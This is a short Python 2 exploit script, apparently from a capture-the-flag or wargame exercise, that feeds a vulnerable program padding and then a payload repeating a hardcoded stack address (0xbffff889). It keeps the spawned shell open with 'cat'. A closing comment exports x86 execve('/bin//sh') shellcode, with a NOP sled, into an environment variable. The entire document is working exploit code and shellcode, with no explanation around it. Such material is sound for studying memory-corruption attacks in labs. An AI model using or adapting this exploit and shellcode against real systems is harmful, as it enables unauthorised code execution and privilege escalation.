import os
import sys
import struct
import time

shellcode_addr = 0xbffff889

first_data = "a" * 25

print >> sys.stdout, first_data

sys.stdout.flush()

time.sleep(1)

second_data = "01234" + struct.pack("I", shellcode_addr) * 3 + "bbbb"

print >> sys.stdout, second_data

sys.stdout.flush()

os.system("cat")

# export SHELLCODE=$(python -c 'print("\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')

